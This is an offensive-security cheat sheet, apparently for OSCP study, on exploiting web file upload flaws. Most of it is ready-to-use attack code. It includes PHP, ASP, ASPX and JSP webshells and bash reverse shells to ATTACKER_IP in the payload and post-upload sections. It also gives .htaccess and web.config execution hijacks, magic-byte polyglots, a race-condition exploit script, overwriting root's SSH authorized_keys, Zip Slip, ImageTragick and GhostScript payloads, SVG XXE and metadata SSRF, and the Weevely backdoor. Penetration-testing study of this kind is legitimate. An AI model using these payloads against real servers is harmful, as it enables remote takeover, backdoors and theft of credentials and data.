# File Upload Vulnerabilities — Complete OSCP Methodology


---

## Table of Contents

1. [Overview & Where to Look](#1-overview--where-to-look)
2. [Basic Webshell Payloads](#2-basic-webshell-payloads)
3. [Client-Side Filter Bypass](#3-client-side-filter-bypass)
4. [Content-Type / MIME Bypass](#4-content-type--mime-bypass)
5. [Extension Bypass](#5-extension-bypass)
6. [The .htaccess Trick](#6-the-htaccess-trick)
7. [Magic Bytes / File Signature Bypass](#7-magic-bytes--file-signature-bypass)
8. [Double Extension & Null Byte](#8-double-extension--null-byte)
9. [Path Traversal via Upload](#9-path-traversal-via-upload)
10. [Race Condition Upload](#10-race-condition-upload)
11. [Polyglot Files](#11-polyglot-files)
12. [Image Upload Exploitation](#12-image-upload-exploitation)
13. [ZIP / Archive Exploits](#13-zip--archive-exploits)
14. [SVG Upload → XSS / XXE](#14-svg-upload--xss--xxe)
15. [Server-Specific Bypass Techniques](#15-server-specific-bypass-techniques)
16. [Finding the Upload Path](#16-finding-the-upload-path)
17. [Post-Upload Escalation](#17-post-upload-escalation)
18. [Automation & Wordlists](#18-automation--wordlists)
19. [Master Checklist](#19-master-checklist)
20. [External References](#20-external-references)

---

## 1. Overview & Where to Look

### What Is It

The application allows file upload but fails to properly validate file type, content, or destination. An attacker uploads a webshell or malicious file and executes it on the server.

### Attack Flow

```
Find upload → Identify filters → Bypass validation → Upload shell → Find upload path → Trigger execution → RCE
```

### Where to Look

- Profile picture / avatar upload
- Document upload (resume, attachments)
- Import functionality (CSV, XML, config)
- CMS media library
- Support ticket file attachments
- Forum post attachments
- Any form with `<input type="file">`

---

## 2. Basic Webshell Payloads

### PHP

```php
# Minimal one-liner
<?php system($_GET['cmd']); ?>

# Alternative functions
<?php exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php echo `$_GET[cmd]`; ?>

# With output formatting
<?php echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>

# POST-based (harder to detect in logs)
<?php system($_POST['cmd']); ?>

# Eval-based
<?php eval($_GET['cmd']); ?>

# File manager + shell
<?php
if(isset($_GET['cmd'])) echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';
if(isset($_GET['read'])) echo '<pre>'.htmlspecialchars(file_get_contents($_GET['read'])).'</pre>';
?>
```

### ASP / ASPX

```asp
<%-- Classic ASP --%>
<% Set objShell = CreateObject("WScript.Shell") %>
<% Set objExec = objShell.Exec("cmd /c " & Request("cmd")) %>
<%= objExec.StdOut.ReadAll() %>
```

```aspx
<%-- ASPX --%>
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.UseShellExecute = false;
p.Start();
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>
```

### JSP

```jsp
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
java.io.InputStream is = p.getInputStream();
int c;
while ((c = is.read()) != -1) out.print((char)c);
%>
```

### Python (CGI)

```python
#!/usr/bin/env python3
import subprocess, cgi
print("Content-Type: text/html\n")
params = cgi.FieldStorage()
cmd = params.getvalue("cmd", "id")
print("<pre>" + subprocess.check_output(cmd, shell=True).decode() + "</pre>")
```

### Reverse Shell (PHP)

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

---

## 3. Client-Side Filter Bypass

If validation is only in JavaScript (front-end):

```
Method 1: Disable JavaScript in browser
Method 2: Intercept with Burp → change filename/content after JS validation
Method 3: Upload allowed file → Intercept → change extension + content
Method 4: Use curl directly (bypasses all JS)
```

```bash
# Upload directly with curl, skipping front-end entirely
curl -X POST http://target.com/upload \
  -F "file=@shell.php;type=image/jpeg" \
  -b "session=YOUR_SESSION_COOKIE"
```

---

## 4. Content-Type / MIME Bypass

Server checks the `Content-Type` header but not the actual content.

```
# In Burp, intercept the upload and change Content-Type:

Original:
Content-Type: application/x-php

Change to:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

```bash
# curl with spoofed Content-Type
curl -X POST http://target.com/upload \
  -F "file=@shell.php;type=image/jpeg"
```

---

## 5. Extension Bypass

### Alternative PHP Extensions

```
.php       ← standard
.php3
.php4
.php5
.php7
.php8
.pht
.phtm
.phtml
.phps
.phar
.pgif
.inc
.module    ← Drupal
.cgi
```

### Alternative ASP/ASPX Extensions

```
.asp
.aspx
.ashx
.asmx
.ascx
.cer
.asa
.config    ← web.config can execute code
```

### Alternative JSP Extensions

```
.jsp
.jspx
.jsw
.jsv
.jspf
.war       ← deployable archive
```

### Case Manipulation

```
.pHp
.Php
.PHP
.PhP
.pHP
.pHp7
```

### Trailing Characters

```
shell.php.
shell.php..
shell.php...
shell.php   (trailing space)
shell.php%20
shell.php%0a    (newline)
shell.php%0d%0a
shell.php/
shell.php.\
```

### URL Encoding

```
shell.p%68p           # %68 = 'h'
shell.%70%68%70       # %70%68%70 = 'php'
shell.ph%70
```

---

## 6. The .htaccess Trick

**This is the key technique.** If the server runs Apache with `AllowOverride` enabled, you can upload a `.htaccess` file that tells Apache to execute your file as PHP, regardless of its extension.

### Step 1: Upload .htaccess

```apache
# .htaccess — tell Apache to treat .evil files as PHP
AddType application/x-httpd-php .evil

# Or more broadly — treat ANY file with a specific extension as PHP
AddHandler php-script .evil
AddHandler php7-script .evil
```

```apache
# Alternative: execute ALL files in this directory as PHP
# (very aggressive)
SetHandler application/x-httpd-php
```

```apache
# Or target a specific filename
<Files "shell.jpg">
  SetHandler application/x-httpd-php
</Files>
```

```apache
# Or match a pattern
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

### Step 2: Upload Your Shell with the Custom Extension

```bash
# shell.evil contains PHP code
<?php system($_GET['cmd']); ?>
```

### Step 3: Execute

```
http://target.com/uploads/shell.evil?cmd=id
```

### .htaccess Variations

```apache
# PHP via CGI
Options +ExecCGI
AddHandler cgi-script .evil

# Enable SSI (for <!--#exec --> payloads)
Options +Includes
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml

# Redirect-based execution
RewriteEngine On
RewriteRule ^shell\.txt$ shell.php [L]
```

### Important Notes

```
- .htaccess only works on Apache with AllowOverride All (or at least FileInfo)
- Many modern setups use AllowOverride None — .htaccess is ignored
- Nginx does NOT use .htaccess at all
- IIS uses web.config instead (see Server-Specific section)
```

---

## 7. Magic Bytes / File Signature Bypass

Server checks the first few bytes (magic bytes / file signature) to verify file type.

### Prepend Magic Bytes to Shell

```bash
# GIF header + PHP shell
echo -n 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Or hex: GIF89a = 47 49 46 38 39 61
printf '\x47\x49\x46\x38\x39\x61' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# JPEG header + PHP shell
printf '\xFF\xD8\xFF\xE0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# PNG header + PHP shell
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# BMP header + PHP shell
printf '\x42\x4D' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# PDF header + PHP shell
echo '%PDF-1.4' > shell.pdf.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.pdf.php
```

### Common Magic Bytes

| Format | Magic Bytes (Hex) | ASCII |
|---|---|---|
| GIF | `47 49 46 38 37 61` or `47 49 46 38 39 61` | `GIF87a` or `GIF89a` |
| JPEG | `FF D8 FF E0` or `FF D8 FF E1` | — |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `.PNG....` |
| BMP | `42 4D` | `BM` |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK..` |

### Bypass getimagesize() (PHP)

```bash
# Create a real small image, then append PHP
convert -size 1x1 xc:white shell.php.jpg   # ImageMagick
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# Or use exiftool to inject into EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

---

## 8. Double Extension & Null Byte

### Double Extensions

```
# Apache may execute based on the FIRST recognized extension
shell.php.jpg          # Apache processes .php if AddHandler is set
shell.php.png
shell.php.txt
shell.php.xxxxx        # Unknown second ext → falls back to .php
shell.php%2ejpg        # URL-encoded dot

# Reversed
shell.jpg.php          # Last extension wins on most servers
shell.png.php
```

### Null Byte Injection

```
# Works on PHP < 5.3.4 and old platforms
shell.php%00.jpg       # Server sees .jpg, PHP sees shell.php
shell.php\x00.jpg
shell.php\0.jpg
shell.asp%00.jpg
```

### Semicolon (IIS)

```
# IIS parses up to the semicolon
shell.asp;.jpg         # IIS executes as .asp
shell.aspx;.jpg
shell.asp;blah.jpg
```

---

## 9. Path Traversal via Upload

### Filename Manipulation

```
# In Burp, change the filename in the multipart upload:

Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Disposition: form-data; name="file"; filename="..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php"
Content-Disposition: form-data; name="file"; filename="....//....//....//var/www/html/shell.php"

# Overwrite .htaccess in a parent directory
Content-Disposition: form-data; name="file"; filename="../.htaccess"
```

### Overwrite Authorized Keys

```bash
# Generate SSH key
ssh-keygen -t rsa -f pwned

# Upload authorized_keys via path traversal
filename="../../../../root/.ssh/authorized_keys"
# Content: your public key

# Then SSH in
ssh -i pwned root@target.com
```

---

## 10. Race Condition Upload

Server uploads the file, then validates and deletes it. If you request it between upload and deletion:

### Technique

```python
import requests
import threading

URL_UPLOAD = "http://target.com/upload"
URL_SHELL = "http://target.com/uploads/shell.php"
SHELL_CONTENT = b"<?php system($_GET['cmd']); ?>"

def upload():
    while True:
        files = {'file': ('shell.php', SHELL_CONTENT, 'image/jpeg')}
        requests.post(URL_UPLOAD, files=files, cookies={"session": "YOUR_COOKIE"})

def trigger():
    while True:
        r = requests.get(URL_SHELL, params={"cmd": "id"})
        if "uid=" in r.text:
            print(f"[+] RCE! {r.text}")
            return

# Run both in parallel
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=trigger)
t1.daemon = True
t2.daemon = True
t1.start()
t2.start()
t2.join()
```

### Turbo Intruder (Burp)

```
1. Send upload request to Turbo Intruder
2. Send trigger request (GET shell) simultaneously
3. Use race-single-packet-attack.py template
```

---

## 11. Polyglot Files

A file that is simultaneously valid as two formats.

### JPEG + PHP Polyglot

```bash
# Inject PHP into EXIF data of a real JPEG
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
# Rename to .php or use .htaccess trick
cp legit.jpg shell.php

# Or manually: take a real JPEG, inject PHP after valid header
# The image renders AND the PHP executes
```

### GIF + PHP Polyglot

```php
GIF89a<?php system($_GET['cmd']); ?>
```

Save as `shell.gif.php` or `shell.php` (with GIF magic bytes to pass signature check).

### PNG + PHP Polyglot (IDAT chunk)

```bash
# Use tools like png_payload to inject PHP into IDAT chunks
# These survive image re-processing / re-encoding
python3 png_payload.py -o polyglot.png -p '<?php system($_GET["cmd"]); ?>'
```

---

## 12. Image Upload Exploitation

### ImageMagick Exploits (ImageTragick — CVE-2016-3714)

If the server uses ImageMagick to process uploads:

```
# exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id")'
pop graphic-context
```

```
# exploit.svg (ImageMagick SVG processing)
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px">
<image xlink:href="https://example.com/image.jpg&quot;|id&quot;" x="0" y="0" height="640px" width="480px"/>
</svg>
```

```
# exploit.png (MSL payload)
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:|id > /tmp/pwned'
pop graphic-context
```

### GhostScript Exploits

If the server converts PDF/PS/EPS with GhostScript:

```postscript
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /teleport pdfmark
(%pipe%id) (r) file
/str 256 string def
{readline {print (\n) print} {exit} ifelse} loop
```

---

## 13. ZIP / Archive Exploits

### Zip Slip (Path Traversal)

```bash
# Create a zip with path traversal filenames
python3 -c "
import zipfile
z = zipfile.ZipFile('evil.zip', 'w')
z.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')
z.close()
"
# If the server extracts to a directory, shell.php lands in webroot
```

### Zip Bomb

```bash
# Nested zip bomb (for DoS / WAF bypass testing)
dd if=/dev/zero bs=1M count=1024 | zip bomb.zip -
```

### Symlink in ZIP

```bash
# Create a symlink pointing to /etc/passwd, zip it
ln -s /etc/passwd symlink.txt
zip --symlinks evil.zip symlink.txt
# If server extracts and serves the file, it reads /etc/passwd
```

---

## 14. SVG Upload → XSS / XXE

### SVG → XSS

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <rect width="100" height="100"/>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
```

### SVG → XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### SVG → SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

## 15. Server-Specific Bypass Techniques

### Apache

```
- .htaccess upload (see Section 6)
- Double extensions: shell.php.jpg if AddHandler php-script .php
- mod_negotiation: upload shell.php and request /uploads/shell (no extension)
```

### Nginx

```
- No .htaccess support
- But: Nginx + PHP-FPM misconfiguration:
  If cgi.fix_pathinfo=1 in php.ini:
  Upload: shell.jpg (with PHP code)
  Request: http://target.com/uploads/shell.jpg/.php
  → PHP-FPM executes shell.jpg as PHP

- Nginx path traversal via alias misconfiguration
```

### IIS

```
- web.config upload (equivalent of .htaccess for IIS)
- Semicolon bypass: shell.asp;.jpg
- Short filename: shel~1.asp (8.3 naming)
```

#### web.config (IIS .htaccess Equivalent)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="evil" path="*.jpg" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

Or for ASPX:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="evil" path="*.jpg" verb="*"
           type="System.Web.UI.PageHandlerFactory"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

### Tomcat

```
- Deploy .war file (if manager is accessible)
- Upload .jsp shell
```

---

## 16. Finding the Upload Path

```bash
# Check response for path disclosure after upload
# Common upload directories:
/uploads/
/upload/
/files/
/images/
/media/
/static/uploads/
/assets/uploads/
/wp-content/uploads/    # WordPress
/sites/default/files/   # Drupal

# Directory brute-force
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Check the response headers/body after upload for the filename or path
# The app may return the URL or use a predictable naming scheme

# Try the original filename
http://target.com/uploads/shell.php

# Check for renamed files (hash, timestamp)
# Look at other uploaded files for the pattern
```

---

## 17. Post-Upload Escalation

### Trigger Execution

```bash
# Direct access
curl "http://target.com/uploads/shell.php?cmd=id"

# Via LFI (if direct access blocked)
?page=../uploads/shell.php&cmd=id
?page=php://filter/resource=../uploads/shell.php

# Via SSRF
?url=http://127.0.0.1/uploads/shell.php?cmd=id
```

### Upgrade to Full Reverse Shell

```bash
# From webshell, get a proper reverse shell:
curl "http://target.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"

# Or upload a better shell:
# Pentest Monkey PHP reverse shell
# p0wny-shell (interactive webshell)
# weevely (encrypted backdoor)
```

### Weevely (Encrypted PHP Backdoor)

```bash
# Generate backdoor
weevely generate password shell.php

# Upload shell.php to target

# Connect
weevely http://target.com/uploads/shell.php password

# Now you have a pseudo-terminal
```

### From Webshell to Privesc

```
1. Upload → RCE as www-data / apache / iis apppool
2. Enumerate: whoami, id, uname -a, cat /etc/os-release
3. Check sudo -l, SUID binaries, cron jobs
4. LinPEAS / WinPEAS
5. Kernel exploits
6. Credential hunting in config files
```

---

## 18. Automation & Wordlists

### Extension Fuzzing with Burp Intruder

```
1. Upload a legitimate file, intercept with Burp
2. Send to Intruder
3. Set payload position on the file extension
4. Payload list: all PHP/ASP/JSP extensions from Section 5
5. Check which responses differ (200 vs 403 vs different size)
```

### ffuf Extension Fuzzing

```bash
# Fuzz upload with different extensions
ffuf -u http://target.com/upload -X POST \
  -H "Content-Type: multipart/form-data; boundary=----BOUNDARY" \
  -d "------BOUNDARY\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.FUZZ\"\r\nContent-Type: image/jpeg\r\n\r\n<?php system(\$_GET['cmd']); ?>\r\n------BOUNDARY--" \
  -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt \
  -fs <default_size>
```

### Useful Wordlists

```bash
# Extension lists
/usr/share/seclists/Discovery/Web-Content/web-extensions.txt
/usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt

# Upload directory discovery
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Webshells
/usr/share/webshells/            # Kali default
/usr/share/seclists/Web-Shells/
```

---

## 19. Master Checklist

### Reconnaissance

- [ ] Identify all upload functionality
- [ ] Check what file types are accepted
- [ ] Upload a legit file and find where it's stored
- [ ] Check if uploaded files are accessible directly via URL
- [ ] Check if the server executes code in the upload directory

### Client-Side Bypass

- [ ] Check if validation is JS-only → intercept with Burp
- [ ] Upload valid file → change extension in Burp

### Content-Type Bypass

- [ ] Change Content-Type to `image/jpeg` or `image/png`

### Extension Bypass

- [ ] Try all alternative extensions (.php3, .php5, .phtml, .phar, etc.)
- [ ] Try case variation (.pHp, .PHP)
- [ ] Try trailing dot/space/newline (`shell.php.`, `shell.php%20`, `shell.php%0a`)
- [ ] Try double extensions (`shell.php.jpg`, `shell.jpg.php`)
- [ ] Try null byte (`shell.php%00.jpg`) — old PHP only
- [ ] Try semicolon (`shell.asp;.jpg`) — IIS only
- [ ] Try URL-encoded extension

### .htaccess / web.config

- [ ] Upload `.htaccess` with `AddType application/x-httpd-php .evil`
- [ ] Upload shell with `.evil` extension
- [ ] On IIS: upload `web.config` with handler mapping

### Content Validation Bypass

- [ ] Prepend magic bytes (GIF89a, JPEG header, PNG header)
- [ ] Inject PHP into EXIF data with exiftool
- [ ] Create polyglot file (valid image + valid PHP)

### Advanced

- [ ] Try path traversal in filename (`../../../shell.php`)
- [ ] Try race condition (upload + trigger simultaneously)
- [ ] Try SVG upload with XXE/XSS payload
- [ ] Try ZIP upload with path traversal (Zip Slip)
- [ ] Check for ImageMagick processing → ImageTragick
- [ ] Check for Nginx + PHP-FPM misconfiguration (`/uploads/image.jpg/.php`)

### Post-Upload

- [ ] Access the shell directly
- [ ] If blocked → trigger via LFI or SSRF
- [ ] Upgrade to reverse shell
- [ ] Enumerate for privesc

---

## 20. External References

- [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks — File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [SecLists — Web Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
- [PHP Reverse Shell (Pentest Monkey)](https://github.com/pentestmonkey/php-reverse-shell)
- [Weevely](https://github.com/epinna/weevely3)
- [p0wny-shell](https://github.com/flozz/p0wny-shell)
